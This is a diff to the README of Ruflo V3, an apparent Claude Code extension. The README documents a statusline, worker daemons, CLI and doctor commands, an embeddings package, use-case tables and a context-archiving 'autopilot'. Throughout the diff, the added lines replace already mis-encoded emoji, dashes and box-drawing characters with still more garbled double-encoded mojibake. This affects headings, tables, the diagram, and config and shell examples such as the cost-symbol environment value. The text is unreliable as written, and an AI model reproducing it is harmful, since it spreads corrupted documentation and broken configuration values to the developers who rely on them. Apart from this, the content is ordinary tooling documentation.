+| `ÃƒÂ¢Ã¢â‚¬â€œÃ…Â  Ruflo V3` | Project header | Always shown |
+| `ÃƒÂ¢Ã¢â‚¬â€Ã‚Â ruvnet` | GitHub user | `gh api user` CLI |
+| `ÃƒÂ¢Ã…Â½Ã¢â‚¬Â¡ main` | Current git branch | `git branch --show-current` |
 | `Opus 4.6` | Claude model name | Stdin JSON `model.display_name` |
-| `Ã¢â€”Â42% ctx` | Context window usage | Stdin JSON `context_window.used_percentage` |
+| `ÃƒÂ¢Ã¢â‚¬â€Ã‚Â42% ctx` | Context window usage | Stdin JSON `context_window.used_percentage` |
 | `$0.15` | Session cost | Stdin JSON `cost.total_cost_usd` |
-| `[Ã¢â€”ÂÃ¢â€”ÂÃ¢â€”ÂÃ¢â€”ÂÃ¢â€”â€¹]` | DDD domain progress bar | `.claude-flow/metrics/v3-progress.json` |
-| `Ã¢Å¡Â¡ HNSW 150x` | HNSW search speedup | AgentDB file stats |
-| `Ã¢â€”â€°/Ã¢â€”â€¹` | Swarm coordination status | Process detection |
+| `[ÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã‚ÂÃƒÂ¢Ã¢â‚¬â€Ã¢â‚¬Â¹]` | DDD domain progress bar | `.claude-flow/metrics/v3-progress.json` |
+| `ÃƒÂ¢Ã…Â¡Ã‚Â¡ HNSW 150x` | HNSW search speedup | AgentDB file stats |
+| `ÃƒÂ¢Ã¢â‚¬â€Ã¢â‚¬Â°/ÃƒÂ¢Ã¢â‚¬â€Ã¢â‚¬Â¹` | Swarm coordination status | Process detection |
 | `[12/8]` | Active agents / max agents | `ps aux` process count |
-| `Ã°Å¸â€˜Â¥ 3` | Sub-agents spawned | Task tool agent count |
-| `Ã°Å¸Å¸Â¢ CVE 3/3` | Security CVE remediation | `.claude-flow/security/audit-status.json` |
-| `Ã°Å¸â€™Â¾ 512MB` | Memory usage | Node.js process RSS |
-| `Ã°Å¸Â§Â  15%` | Intelligence score | Pattern count from AgentDB |
-| `Ã°Å¸â€œÂ¦ AgentDB Ã¢â€”Â1.2K` | AgentDB vector count | File size estimate (`size / 2KB`) |
+| `ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¥ 3` | Sub-agents spawned | Task tool agent count |
+| `ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â¢ CVE 3/3` | Security CVE remediation | `.claude-flow/security/audit-status.json` |
+| `ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¾ 512MB` | Memory usage | Node.js process RSS |
+| `ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  15%` | Intelligence score | Pattern count from AgentDB |
+| `ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ AgentDB ÃƒÂ¢Ã¢â‚¬â€Ã‚Â1.2K` | AgentDB vector count | File size estimate (`size / 2KB`) |
 
 **Customizing the cost segment:**
 
@@ -2590,27 +2590,27 @@ Claude Code pipes JSON session data via **stdin** to the statusline script after
 
 | Variable | Effect | Example |
 |----------|--------|---------|
-| `RUFLO_STATUSLINE_COST_SYMBOL` | Overrides the leading `$`. Set to an empty string to show the number alone. | `RUFLO_STATUSLINE_COST_SYMBOL=Ã¢Å¡Â¡` Ã¢â€ â€™ `Ã¢Å¡Â¡1.30` |
+| `RUFLO_STATUSLINE_COST_SYMBOL` | Overrides the leading `$`. Set to an empty string to show the number alone. | `RUFLO_STATUSLINE_COST_SYMBOL=ÃƒÂ¢Ã…Â¡Ã‚Â¡` ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ `ÃƒÂ¢Ã…Â¡Ã‚Â¡1.30` |
 | `RUFLO_STATUSLINE_HIDE_COST` | `1`/`true`/`yes`/`on` removes the segment entirely. | `RUFLO_STATUSLINE_HIDE_COST=1` |
 
-Set them in the `env` block of `.cursor/hooks.json` Ã¢â‚¬â€ Claude Code applies it to every session and to the statusline subprocess, and unlike hand-editing the helper it survives `npx ruflo@latest init --update`:
+Set them in the `env` block of `.cursor/hooks.json` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Claude Code applies it to every session and to the statusline subprocess, and unlike hand-editing the helper it survives `npx ruflo@latest init --update`:
 
 ```json
 {
   "statusLine": { "type": "command", "command": "node .cursor/hooks/statusline.cjs" },
-  "env": { "RUFLO_STATUSLINE_COST_SYMBOL": "Ã¢Å¡Â¡" }
+  "env": { "RUFLO_STATUSLINE_COST_SYMBOL": "ÃƒÂ¢Ã…Â¡Ã‚Â¡" }
 }
 ```
 
 Or export them in your shell profile before launching Claude Code:
 
 ```bash
-export RUFLO_STATUSLINE_COST_SYMBOL=Ã¢Å¡Â¡   # or: export RUFLO_STATUSLINE_HIDE_COST=1
+export RUFLO_STATUSLINE_COST_SYMBOL=ÃƒÂ¢Ã…Â¡Ã‚Â¡   # or: export RUFLO_STATUSLINE_HIDE_COST=1
 ```
 
 **Setup (Automatic):**
 
-Run `npx ruflo@latest init` Ã¢â‚¬â€ this generates `.cursor/hooks.json` with the correct statusline config and creates the helper script at `.cursor/hooks/statusline.cjs`.
+Run `npx ruflo@latest init` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â this generates `.cursor/hooks.json` with the correct statusline config and creates the helper script at `.cursor/hooks/statusline.cjs`.
 
 The generated config uses a **fast local script** (no `npx` cold-start):
 ```json
@@ -2622,7 +2622,7 @@ The generated config uses a **fast local script** (no `npx` cold-start):
 }
 ```
 
-> **Note:** Only `type`, `command`, and `padding` are valid statusLine fields. Do not add `refreshMs`, `enabled`, or other fields Ã¢â‚¬â€ Claude Code will ignore them.
+> **Note:** Only `type`, `command`, and `padding` are valid statusLine fields. Do not add `refreshMs`, `enabled`, or other fields ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Claude Code will ignore them.
 
 **For Existing Users:**
 
@@ -2649,19 +2649,19 @@ Claude Code provides session data via stdin in this format:
 The statusline script reads stdin synchronously, falls back to local detection when run manually (TTY mode).
 
 **Data Sources:**
-- **Stdin JSON** Ã¢â‚¬â€ Model name, context %, cost, duration (from Claude Code)
-- `.claude-flow/metrics/v3-progress.json` Ã¢â‚¬â€ DDD domain progress
-- `.claude-flow/metrics/swarm-activity.json` Ã¢â‚¬â€ Active agent counts
-- `.claude-flow/security/audit-status.json` Ã¢â‚¬â€ CVE remediation status
-- **AgentDB files** Ã¢â‚¬â€ Vector count (estimated from file size), HNSW index status
-- Process detection via `ps aux` Ã¢â‚¬â€ Real-time memory and agent counts
+- **Stdin JSON** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Model name, context %, cost, duration (from Claude Code)
+- `.claude-flow/metrics/v3-progress.json` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â DDD domain progress
+- `.claude-flow/metrics/swarm-activity.json` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Active agent counts
+- `.claude-flow/security/audit-status.json` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â CVE remediation status
+- **AgentDB files** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Vector count (estimated from file size), HNSW index status
+- Process detection via `ps aux` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Real-time memory and agent counts
 - Git branch via `git branch --show-current`
 - GitHub user via `gh api user`
 
 </details>
 
 <details>
-<summary>Ã¢Å¡â„¢Ã¯Â¸Â <strong>Background Daemons</strong> Ã¢â‚¬â€ Auto-scheduled workers for continuous optimization</summary>
+<summary>ÃƒÂ¢Ã…Â¡Ã¢â€žÂ¢ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Background Daemons</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Auto-scheduled workers for continuous optimization</summary>
 
 **V3 Node.js Worker Daemon (Recommended)**
 
@@ -2696,7 +2696,7 @@ npx ruflo@latest daemon stop
 **Daemon Status Output:**
 ```
 +-- Worker Daemon ---+
-| Status: Ã¢â€”Â RUNNING  |
+| Status: ÃƒÂ¢Ã¢â‚¬â€Ã‚Â RUNNING  |
 | PID: 12345         |
 | Workers Enabled: 5 |
 | Max Concurrent: 3  |
@@ -2706,11 +2706,11 @@ Worker Status
 +-------------+----+----------+------+---------+----------+----------+
 | Worker      | On | Status   | Runs | Success | Last Run | Next Run |
 +-------------+----+----------+------+---------+----------+----------+
-| map         | Ã¢Å“â€œ  | idle     | 12   | 100%    | 2m ago   | in 3m    |
-| audit       | Ã¢Å“â€œ  | idle     | 6    | 100%    | 5m ago   | in 5m    |
-| optimize    | Ã¢Å“â€œ  | running  | 4    | 100%    | now      | -        |
-| consolidate | Ã¢Å“â€œ  | idle     | 2    | 100%    | 15m ago  | in 15m   |
-| testgaps    | Ã¢Å“â€œ  | idle     | 3    | 100%    | 8m ago   | in 12m   |
+| map         | ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“  | idle     | 12   | 100%    | 2m ago   | in 3m    |
+| audit       | ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“  | idle     | 6    | 100%    | 5m ago   | in 5m    |
+| optimize    | ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“  | running  | 4    | 100%    | now      | -        |
+| consolidate | ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“  | idle     | 2    | 100%    | 15m ago  | in 15m   |
+| testgaps    | ÃƒÂ¢Ã…â€œÃ¢â‚¬Å“  | idle     | 3    | 100%    | 8m ago   | in 12m   |
 +-------------+----+----------+------+---------+----------+----------+
 ```
 
@@ -2762,7 +2762,7 @@ Shell-based daemons for monitoring (Linux/macOS only):
 </details>
 
 <details>
-<summary>Ã¢Å’Â¨Ã¯Â¸Â <strong>V3 CLI Commands</strong> Ã¢â‚¬â€ 26 commands with 140+ subcommands</summary>
+<summary>ÃƒÂ¢Ã…â€™Ã‚Â¨ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>V3 CLI Commands</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â 26 commands with 140+ subcommands</summary>
 
 Complete command-line interface for all Ruflo operations.
 
@@ -2830,7 +2830,7 @@ npx ruflo@latest performance benchmark --suite all
 </details>
 
 <details>
-<summary>Ã°Å¸Â©Âº <strong>Doctor Health Checks</strong> Ã¢â‚¬â€ System diagnostics with auto-fix</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â©Ã‚Âº <strong>Doctor Health Checks</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â System diagnostics with auto-fix</summary>
 
 Run `npx ruflo@latest doctor` to diagnose and fix common issues.
 
@@ -2838,16 +2838,16 @@ Run `npx ruflo@latest doctor` to diagnose and fix common issues.
 
 | Check | Requirement | Auto-Fix |
 |-------|-------------|----------|
-| **Node.js version** | 20+ | Ã¢ÂÅ’ Manual upgrade required |
-| **npm version** | 9+ | Ã¢ÂÅ’ Manual upgrade required |
-| **Git installation** | Any version | Ã¢ÂÅ’ Manual install required |
-| **Config file validity** | Valid JSON/YAML | Ã¢Å“â€¦ Regenerates defaults |
-| **Daemon status** | Running | Ã¢Å“â€¦ Restarts daemons |
-| **Memory database** | SQLite writable | Ã¢Å“â€¦ Recreates if corrupt |
-| **API keys** | Valid format | Ã¢ÂÅ’ Manual configuration |
-| **MCP servers** | Responsive | Ã¢Å“â€¦ Restarts unresponsive servers |
-| **Disk space** | >100MB free | Ã¢ÂÅ’ Manual cleanup required |
-| **TypeScript** | Installed | Ã¢Å“â€¦ Installs if missing |
+| **Node.js version** | 20+ | ÃƒÂ¢Ã‚ÂÃ…â€™ Manual upgrade required |
+| **npm version** | 9+ | ÃƒÂ¢Ã‚ÂÃ…â€™ Manual upgrade required |
+| **Git installation** | Any version | ÃƒÂ¢Ã‚ÂÃ…â€™ Manual install required |
+| **Config file validity** | Valid JSON/YAML | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Regenerates defaults |
+| **Daemon status** | Running | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Restarts daemons |
+| **Memory database** | SQLite writable | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Recreates if corrupt |
+| **API keys** | Valid format | ÃƒÂ¢Ã‚ÂÃ…â€™ Manual configuration |
+| **MCP servers** | Responsive | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Restarts unresponsive servers |
+| **Disk space** | >100MB free | ÃƒÂ¢Ã‚ÂÃ…â€™ Manual cleanup required |
+| **TypeScript** | Installed | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Installs if missing |
 
 **Commands:**
 
@@ -2868,17 +2868,17 @@ npx ruflo@latest doctor --verbose
 **Output Example:**
 
 ```
-Ã°Å¸Â©Âº Ruflo Doctor v3.5
+ÃƒÂ°Ã…Â¸Ã‚Â©Ã‚Âº Ruflo Doctor v3.5
 
-Ã¢Å“â€¦ Node.js      20.11.0 (required: 20+)
-Ã¢Å“â€¦ npm          10.2.4 (required: 9+)
-Ã¢Å“â€¦ Git          2.43.0
-Ã¢Å“â€¦ Config       Valid claude-flow.config.json
-Ã¢Å“â€¦ Daemon       Running (PID: 12345)
-Ã¢Å“â€¦ Memory       SQLite healthy, 1.2MB
-Ã¢Å¡Â Ã¯Â¸Â API Keys    ANTHROPIC_API_KEY set, OPENAI_API_KEY missing
-Ã¢Å“â€¦ MCP Server   Responsive (45ms latency)
-Ã¢Å“â€¦ Disk Space   2.4GB available
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Node.js      20.11.0 (required: 20+)
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ npm          10.2.4 (required: 9+)
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Git          2.43.0
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Config       Valid claude-flow.config.json
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Daemon       Running (PID: 12345)
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Memory       SQLite healthy, 1.2MB
+ÃƒÂ¢Ã…Â¡Ã‚Â ÃƒÂ¯Ã‚Â¸Ã‚Â API Keys    ANTHROPIC_API_KEY set, OPENAI_API_KEY missing
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ MCP Server   Responsive (45ms latency)
+ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Disk Space   2.4GB available
 
 Summary: 9/10 checks passed
 ```
@@ -2886,7 +2886,7 @@ Summary: 9/10 checks passed
 </details>
 
 <details>
-<summary>Ã°Å¸â€œÂ¦ <strong>Embeddings Package v3</strong> Ã¢â‚¬â€ Cross-platform ONNX with hyperbolic support</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ <strong>Embeddings Package v3</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Cross-platform ONNX with hyperbolic support</summary>
 
 The embeddings package (v3.0.0-alpha.12) provides high-performance vector embeddings with multiple backends.
 
@@ -2897,7 +2897,7 @@ The embeddings package (v3.0.0-alpha.12) provides high-performance vector embedd
 | **sql.js backend** | Cross-platform SQLite (WASM) | No native compilation needed |
 | **Document chunking** | Configurable overlap and size | Handles large documents |
 | **Normalization** | L2, L1, min-max, z-score | 4 normalization methods |
-| **Hyperbolic embeddings** | PoincarÃƒÂ© ball model | Better hierarchical representation |
+| **Hyperbolic embeddings** | PoincarÃƒÆ’Ã‚Â© ball model | Better hierarchical representation |
 | **agentic-flow ONNX** | Integrated ONNX runtime | faster with ONNX runtime than API calls |
 | **Neural substrate** | RuVector integration | Full learning pipeline |
 
@@ -2931,7 +2931,7 @@ import { createEmbeddingServiceAsync } from '@claude-flow/embeddings';
 
 const service = await createEmbeddingServiceAsync({
   model: 'all-MiniLM-L6-v2',
-  hyperbolic: true,  // Enable PoincarÃƒÂ© ball embeddings
+  hyperbolic: true,  // Enable PoincarÃƒÆ’Ã‚Â© ball embeddings
   cacheSize: 256
 });
 
@@ -2947,14 +2947,14 @@ const results = await service.search("login", { topK: 5 });
 
 ---
 
-## Ã°Å¸Å½Â¯ Use Cases & Workflows
+## ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ Use Cases & Workflows
 
 Real-world scenarios and pre-built workflows for common tasks.
 
 <details>
-<summary>Ã°Å¸Å½Â¯ <strong>Use Cases</strong> Ã¢â‚¬â€ Real-world scenarios and how to solve them</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â¯ <strong>Use Cases</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Real-world scenarios and how to solve them</summary>
 
-### Ã°Å¸â€˜Â¨Ã¢â‚¬ÂÃ°Å¸â€™Â» Development & Code Quality
+### ÃƒÂ°Ã…Â¸Ã¢â‚¬ËœÃ‚Â¨ÃƒÂ¢Ã¢â€šÂ¬Ã‚ÂÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â» Development & Code Quality
 
 | Scenario | What It Solves | How To Do It |
 |----------|----------------|--------------|
@@ -2963,7 +2963,7 @@ Real-world scenarios and pre-built workflows for common tasks.
 | **Refactoring** | Safely restructure code while maintaining behavior | `npx ruflo@latest hive-mind spawn "Refactor user service to repository pattern"` |
 | **Bug Fixing** | Diagnose and fix bugs with full context analysis | `npx ruflo@latest hive-mind spawn "Fix race condition in checkout flow"` |
 
-### Ã°Å¸â€â€™ Security & Compliance
+### ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â„¢ Security & Compliance
 
 | Scenario | What It Solves | How To Do It |
 |----------|----------------|--------------|
@@ -2971,7 +2971,7 @@ Real-world scenarios and pre-built workflows for common tasks.
 | **Dependency Scan** | Identify vulnerable packages and suggest upgrades | `npx ruflo@latest security cve --check` |
 | **Compliance Check** | Ensure code meets security standards | `npx ruflo@latest security audit` |
 
-### Ã°Å¸ÂÂ Multi-Agent Swarms
+### ÃƒÂ°Ã…Â¸Ã‚ÂÃ‚Â Multi-Agent Swarms
 
 | Scenario | What It Solves | How To Do It |
 |----------|----------------|--------------|
@@ -2979,7 +2979,7 @@ Real-world scenarios and pre-built workflows for common tasks.
 | **Large Refactors** | Parallel refactoring across many files without conflicts | `npx ruflo@latest swarm init --topology mesh --max-agents 8` |
 | **Codebase Migration** | Migrate frameworks, languages, or patterns systematically | `npx ruflo@latest task orchestrate "Migrate from Express to Fastify" --strategy adaptive` |
 
-### Ã°Å¸â€œÅ  Performance & Optimization
+### ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  Performance & Optimization
 
 | Scenario | What It Solves | How To Do It |
 |----------|----------------|--------------|
@@ -2987,7 +2987,7 @@ Real-world scenarios and pre-built workflows for common tasks.
 | **Query Optimization** | Speed up slow database queries | `npx ruflo@latest performance benchmark --suite all` |
 | **Memory Analysis** | Reduce memory usage and fix leaks | `npx ruflo@latest performance metrics` |
 
-### Ã°Å¸â€â€ž GitHub & DevOps
+### ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬Å¾ GitHub & DevOps
 
 | Scenario | What It Solves | How To Do It |
 |----------|----------------|--------------|
@@ -2996,7 +2996,7 @@ Real-world scenarios and pre-built workflows for common tasks.
 | **Release Management** | Coordinate releases with changelogs and versioning | `npx ruflo@latest hive-mind spawn "Prepare v2.0 release"` |
 | **CI/CD Optimization** | Speed up pipelines and reduce flaky tests | `npx ruflo@latest hive-mind spawn "Optimize GitHub Actions workflow"` |
 
-### Ã°Å¸â€œâ€¹ Spec-Driven Development
+### ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬Â¹ Spec-Driven Development
 
 | Scenario | What It Solves | How To Do It |
 |----------|----------------|--------------|
@@ -3004,7 +3004,7 @@ Real-world scenarios and pre-built workflows for common tasks.
 | **Validate Implementation** | Ensure code matches specifications | `npx ruflo@latest hooks progress --detailed` |
 | **Track Compliance** | Monitor spec adherence across the team | `npx ruflo@latest progress sync` |
 
-### Ã°Å¸Â§Â  Learning & Intelligence
+### ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Learning & Intelligence
 
 | Scenario | What It Solves | How To Do It |
 |----------|----------------|--------------|
@@ -3016,16 +3016,16 @@ Real-world scenarios and pre-built workflows for common tasks.
 
 ---
 
-## Ã°Å¸Â§Â  Infinite Context & Memory Optimization
+## ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Infinite Context & Memory Optimization
 
 Ruflo eliminates Claude Code's context window ceiling with a real-time memory management system that archives, optimizes, and restores conversation context automatically.
 
 <details>
-<summary>Ã¢â„¢Â¾Ã¯Â¸Â <strong>Context Autopilot</strong> Ã¢â‚¬â€ Never lose context to compaction again</summary>
+<summary>ÃƒÂ¢Ã¢â€žÂ¢Ã‚Â¾ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Context Autopilot</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Never lose context to compaction again</summary>
 
 ### The Problem
 
-Claude Code has a finite context window (~200K tokens). When full, it **compacts** Ã¢â‚¬â€ summarizing the conversation and discarding details like exact file paths, tool outputs, decision reasoning, and code snippets. This creates a "context cliff" where Claude loses the ability to reference earlier work.
+Claude Code has a finite context window (~200K tokens). When full, it **compacts** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â summarizing the conversation and discarding details like exact file paths, tool outputs, decision reasoning, and code snippets. This creates a "context cliff" where Claude loses the ability to reference earlier work.
 
 ### The Solution: Context Autopilot (ADR-051)
 
@@ -3033,15 +3033,15 @@ Ruflo intercepts the compaction lifecycle with three hooks that make context los
 
 ```
 Every Prompt                    Context Full                    After Compact
-     Ã¢â€â€š                              Ã¢â€â€š                              Ã¢â€â€š
-     Ã¢â€“Â¼                              Ã¢â€“Â¼                              Ã¢â€“Â¼
+     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+     ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼                              ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼                              ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼
 UserPromptSubmit              PreCompact                     SessionStart
-     Ã¢â€â€š                              Ã¢â€â€š                              Ã¢â€â€š
+     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
  Archive turns              Archive + BLOCK              Restore from archive
  to SQLite                  auto-compaction               via additionalContext
  (incremental)              (exit code 2)                (importance-ranked)
-     Ã¢â€â€š                              Ã¢â€â€š                              Ã¢â€â€š
-     Ã¢â€“Â¼                              Ã¢â€“Â¼                              Ã¢â€“Â¼
+     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                              ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+     ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼                              ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼                              ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼
  Track tokens              Manual /compact               Seamless continuation
  Report % used             still allowed                 with full history
 ```
@@ -3053,8 +3053,8 @@ UserPromptSubmit              PreCompact                     SessionStart
 | **Proactive Archiving** | Every user prompt archives new turns to SQLite with SHA-256 dedup | Every prompt |
 | **Token Tracking** | Reads actual API `usage` data (input + cache tokens) for accurate % | Every prompt |
 | **Compaction Blocking** | PreCompact hook returns exit code 2 to cancel auto-compaction | When context fills |
-| **Manual Compact** | `/compact` is allowed Ã¢â‚¬â€ archives first, resets autopilot, then compresses | On user request |
-| **Importance Ranking** | Entries scored by `recency Ãƒâ€” frequency Ãƒâ€” richness` for smart retrieval | On restore |
+| **Manual Compact** | `/compact` is allowed ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â archives first, resets autopilot, then compresses | On user request |
+| **Importance Ranking** | Entries scored by `recency ÃƒÆ’Ã¢â‚¬â€ frequency ÃƒÆ’Ã¢â‚¬â€ richness` for smart retrieval | On restore |
 | **Access Tracking** | Restored entries get access_count++ creating a relevance feedback loop | On restore |
 | **Auto-Pruning** | Never-accessed entries older than 30 days are automatically removed | On PreCompact |
 | **Content Compaction** | Old session entries trimmed to summaries, reducing archive storage | Manual or scheduled |
@@ -3064,23 +3064,23 @@ UserPromptSubmit              PreCompact                     SessionStart
 
 | Zone | Threshold | Statusline | Action |
 |------|-----------|-----------|--------|
-| OK | <70% | `Ã°Å¸â€ºÂ¡Ã¯Â¸Â 43% 86.7K Ã¢Å Ëœ` (green) | Normal operation, track growth trend |
-| Warning | 70-85% | `Ã°Å¸â€ºÂ¡Ã¯Â¸Â 72% 144K Ã¢Å Ëœ` (yellow) | Flag approaching limit, archive aggressively |
-| Optimize | 85%+ | `Ã°Å¸â€ºÂ¡Ã¯Â¸Â 88% 176K Ã¢Å¸Â³2` (red) | Prune stale entries, keep responses concise |
+| OK | <70% | `ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â 43% 86.7K ÃƒÂ¢Ã…Â Ã‹Å“` (green) | Normal operation, track growth trend |
+| Warning | 70-85% | `ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â 72% 144K ÃƒÂ¢Ã…Â Ã‹Å“` (yellow) | Flag approaching limit, archive aggressively |
+| Optimize | 85%+ | `ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â 88% 176K ÃƒÂ¢Ã…Â¸Ã‚Â³2` (red) | Prune stale entries, keep responses concise |
 
 ### Real-Time Statusline
 
 The statusline shows live context metrics read from `autopilot-state.json`:
 
 ```
-Ã°Å¸â€ºÂ¡Ã¯Â¸Â  45% 89.2K Ã¢Å Ëœ  Ã°Å¸Â§Â  86%
-Ã¢â€â€š    Ã¢â€â€š   Ã¢â€â€š     Ã¢â€â€š    Ã¢â€â€š   Ã¢â€â€š
-Ã¢â€â€š    Ã¢â€â€š   Ã¢â€â€š     Ã¢â€â€š    Ã¢â€â€š   Ã¢â€â€Ã¢â€â‚¬ Intelligence score (learning.json + patterns + archive)
-Ã¢â€â€š    Ã¢â€â€š   Ã¢â€â€š     Ã¢â€â€š    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Intelligence indicator
-Ã¢â€â€š    Ã¢â€â€š   Ã¢â€â€š     Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ No prune cycles (Ã¢Å Ëœ) or prune count (Ã¢Å¸Â³N)
-Ã¢â€â€š    Ã¢â€â€š   Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Token count (actual API usage)
-Ã¢â€â€š    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Context percentage used
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ Autopilot active (shield icon)
+ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂºÃ‚Â¡ÃƒÂ¯Ã‚Â¸Ã‚Â  45% 89.2K ÃƒÂ¢Ã…Â Ã‹Å“  ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  86%
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
